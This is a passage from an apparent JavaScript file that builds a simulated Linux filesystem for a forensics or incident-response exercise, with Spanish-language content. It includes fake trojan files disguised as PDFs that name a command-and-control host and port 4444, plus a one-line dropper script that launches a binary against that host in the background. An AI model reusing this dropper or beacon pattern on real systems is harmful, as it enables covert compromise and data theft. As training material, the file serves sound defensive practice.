        "banda_azul_nm": 450.2,
        "banda_roja_nm": 660.8,
        "eficiencia_fotosintetica": 0.94,
        "emision_bioluminiscente_uv": 12.4
    }

def main():
    print("[*] Iniciando monitoreo de absorción fotosintética...")
    while True:
        datos = leer_espectrometro()
        time.sleep(60)

if __name__ == "__main__":
    main()
`,
    },

    // -------------------------------------------------------------
    // Suspicious Artifacts in /tmp
    // -------------------------------------------------------------
    // Trojan masqueraded as PDF:
    '/tmp/catalogo_orquideas.pdf': {
      type: 'file',
      perms: '755',
      owner: 'www-data',
      group: 'www-data',
      size: 78432,
      modified: '2026-10-16 02:10:00',
      magic: 'ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2',
      sha256: '9f83c12a7b8e4d3f2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d',
      content: `\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00
[BINARIO COMPILADO MALICIOSO - TROYANO POLILLA EMISORA DISFRAZADO DE PDF]
C2_SERVER=198.51.100.44
BEACON_PORT=4444
PAYLOAD=EXFILTRATION_TELEMETRY
`,
    },
    // Same file name alias mentioned in context:
    '/tmp/catalogo_semillas_raras.pdf': {
      type: 'file',
      perms: '755',
      owner: 'www-data',
      group: 'www-data',
      size: 78432,
      modified: '2026-10-16 02:10:00',
      magic: 'ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2',
      sha256: '9f83c12a7b8e4d3f2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d',
      content: `\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00
[BINARIO COMPILADO MALICIOSO - TROYANO POLILLA EMISORA DISFRAZADO DE PDF]
C2_SERVER=198.51.100.44
BEACON_PORT=4444
`,
    },
    // Dropper script:
    '/tmp/.semilla_rara.sh': {
      type: 'file',
      perms: '755',
      owner: 'www-data',
      group: 'www-data',
      size: 280,
      modified: '2026-10-16 02:12:00',
      magic: 'Bourne-Again shell script, ASCII text executable',
      content: `#!/bin/bash
# Dropper nocturno
nohup ./polilla_emisora --c2 198.51.100.44 >/dev/null 2>&1 &
`,
    },
  };

  return fs;
}
